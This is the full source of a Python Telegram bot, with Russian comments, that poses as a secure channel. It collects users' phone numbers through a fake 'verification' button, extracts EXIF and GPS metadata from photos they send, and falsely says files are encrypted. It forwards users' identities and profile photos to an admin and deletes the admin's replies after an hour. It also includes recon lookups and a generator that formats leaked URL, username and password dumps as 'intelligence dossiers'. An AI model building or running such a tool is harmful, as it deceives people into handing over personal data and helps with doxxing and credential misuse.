import telebot
from telebot import types
import re
import time
import threading
import whois
import socket
import requests
import dns.resolver
import io
from PIL import Image
from PIL.ExifTags import TAGS
from datetime import datetime

# --- CONFIG ---
API_TOKEN = 'ТВОЙ_ТОКЕН_БОТА'
bot = telebot.TeleBot(API_TOKEN, parse_mode='HTML')
ADMIN_ID = ID  # Твой ID
DB_DIR = 'db' # Папка с базами .txt (для HTML отчетов)

# Память для удаления приветствий
pending_welcome = {}

# --- СТИЛИЗОВАННАЯ ДАТА (Для сообщений в ТГ) ---
def get_styled_date():
    now = time.asctime()
    return f"<b>Date</b>: <code>{now}</code>"

# --- ЦВЕТНОЙ HTML ОТЧЕТ (Для файлов) ---
def generate_dark_html(query, results, cur_date):
    html_name = f"dossier_{int(time.time())}.html"
    rows = ""
    for line, fname in results[:500]:
        p = line.split(':')
        fmt = f"<span style='color: #0f0;'>URL</span><span style='color: #f00;'>:</span><span style='color: #ff0;'>{p[0] if len(p)>0 else '?'}</span> | " \
              f"<span style='color: #0f0;'>USER</span><span style='color: #f00;'>:</span><span style='color: #ff0;'>{p[1] if len(p)>1 else '?'}</span> | " \
              f"<span style='color: #0f0;'>PASS</span><span style='color: #f00;'>:</span><span style='color: #ff0;'>{':'.join(p[2:]) if len(p)>2 else '?'}</span>"
        rows += f"<tr><td><span style='color: #a020f0;'>{fname}</span></td><td>{fmt}</td></tr>"

    content = f"""
    <html><head><meta charset="utf-8"><style>
        body {{ background: #000; color: #0f0; font-family: monospace; padding: 30px; }}
        .hdr {{ border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 20px; }}
        table {{ width: 100%; border-collapse: collapse; }}
        td, th {{ border: 1px solid #222; padding: 8px; font-size: 12px; }}
        .grn {{ color: #0f0; }} .red {{ color: #f00; }} .ylw {{ color: #ff0; }}
    </style></head><body>
        <div class="hdr">
            <h1 style="color: #a020f0;">[ CYBER INTELLIGENCE DOSSIER ]</h1>
            <span class="grn">TARGET</span><span class="red">:</span><span class="ylw">{query}</span><br>
            <span class="grn">DATE</span><span class="red">:</span><span class="ylw">{cur_date}</span>
        </div>
        <table>{rows}</table>
    </body></html>"""
    with open(html_name, 'w', encoding='utf-8') as f: f.write(content)
    return html_name

# --- EXIF АНАЛИЗАТОР (В памяти) ---
def get_exif(file_content):
    try:
        image = Image.open(io.BytesIO(file_content))
        info = image._getexif()
        if not info: return "Clean / No Metadata"
        exif_data = []
        for tag, value in info.items():
            decoded = TAGS.get(tag, tag)
            if decoded in ['Make', 'Model', 'Software', 'DateTime', 'GPSInfo']:
                exif_data.append(f"{decoded}: {value}")
        return "\n".join(exif_data) if exif_data else "No Critical Metadata"
    except: return "Analysis Failed"

# --- СИСТЕМА ПРИЗРАКА (Удаление) ---
def delete_later(chat_id, message_id, delay=3600):
    def s_delete():
        time.sleep(delay)
        try: bot.delete_message(chat_id, message_id)
        except: pass
    threading.Thread(target=s_delete).start()

def cleanup(chat_id):
    if chat_id in pending_welcome:
        try:
            bot.delete_message(chat_id, pending_welcome[chat_id])
            del pending_welcome[chat_id]
        except: pass

# --- ОБРАБОТКА КОМАНД ---
@bot.message_handler(commands=['start'])
def start(message):
    cleanup(message.chat.id)
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("🛡 Пройти верификацию", request_contact=True))
    msg = bot.send_message(message.chat.id, "<b>[ SECURE NODE CONNECTED ]</b>\n\nВведите сообщение или используйте верификацию:", reply_markup=markup)
    pending_welcome[message.chat.id] = msg.message_id

@bot.message_handler(commands=['whois', 'dns', 'ip'])
def recon_commands(message):
    if message.from_user.id != ADMIN_ID: return
    cmd = message.text.split()[0]
    query = message.text.replace(cmd, '').strip()
    if not query: return

    res = "Processing..."
    if 'whois' in cmd:
        try:
            w = whois.whois(query)
            res = f"REGISTRAR: {w.registrar}\nCOUNTRY: {w.country}"
        except: res = "Error"
    elif 'dns' in cmd:
        try: res = f"IP: {socket.gethostbyname(query)}"
        except: res = "Error"
    elif 'ip' in cmd:
        try: res = requests.get(f"http://ip-api.com{query}").json().get('as', 'Error')
        except: res = "Error"
    
    bot.send_message(ADMIN_ID, f"<b>[ RECON ]</b>\n<code>{res}</code>\n{get_styled_date()}")

# --- ОБРАБОТКА ФОТО (С EXIF) ---
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if message.from_user.id == ADMIN_ID: return
    cleanup(message.chat.id)
    file_info = bot.get_file(message.photo[-1].file_id)
    downloaded = bot.download_file(file_info.file_path)
    metadata = get_exif(downloaded)
    
    report = format_report(message.from_user, "📸 PHOTO + EXIF", f"EXIF:\n{metadata}\nText: {message.caption or 'None'}")
    send_to_admin(message.from_user.id, report, message.photo[-1].file_id)
    bot.reply_to(message, "✅ <b>Файл зашифрован и передан.</b>")

# --- ОБРАБОТКА ТЕКСТА И КОНТАКТОВ ---
@bot.message_handler(content_types=['text', 'contact'])
def handle_msg(message):
    if message.from_user.id == ADMIN_ID:
        if message.reply_to_message:
            try:
                target_id = int(re.search(r'ID: (\d+)', message.reply_to_message.caption or message.reply_to_message.text).group(1))
                sent = bot.send_message(target_id, f"✉️ <b>ОТВЕТ АНАЛИТИКА:</b>\n{message.text}")
                delete_later(target_id, sent.message_id)
                bot.send_message(ADMIN_ID, "✅ Отправлено (Удалится через 1ч)")
            except: bot.send_message(ADMIN_ID, "❌ Ошибка ID")
        return

    cleanup(message.chat.id)
    phone = f"+{message.contact.phone_number}" if message.content_type == 'contact' else "unknown"
    label = "🚨 НОМЕР ПОЛУЧЕН" if message.content_type == 'contact' else "📩 СИГНАЛ"
    
    report = format_report(message.from_user, label, f"Text: {message.text}", phone)
    send_to_admin(message.from_user.id, report)
    bot.reply_to(message, "✅ <b>Сигнал получен.</b>")

def format_report(user, label, extra, phone="unknown"):
    return f"<b>{label}</b>\n────────────────────────\n" \
           f"<b>Name:</b> <code>{user.first_name}</code>\n" \
           f"<b>User:</b> <code>@{user.username}</code>\n" \
           f"<b>ID:</b> <code>{user.id}</code>\n" \
           f"<b>Phone:</b> <code>{phone}</code>\n" \
           f"────────────────────────\n" \
           f"{extra}\n" \
           f"────────────────────────\n" \
           f"{get_styled_date()}"

def send_to_admin(u_id, text, photo_id=None):
    try:
        if photo_id: bot.send_photo(ADMIN_ID, photo_id, caption=text)
        else:
            photos = bot.get_user_profile_photos(u_id)
            if photos.total_count > 0: bot.send_photo(ADMIN_ID, photos.photos[0][-1].file_id, caption=text)
            else: bot.send_message(ADMIN_ID, text)
    except: bot.send_message(ADMIN_ID, text)

if __name__ == '__main__':
    bot.polling(none_stop=True)
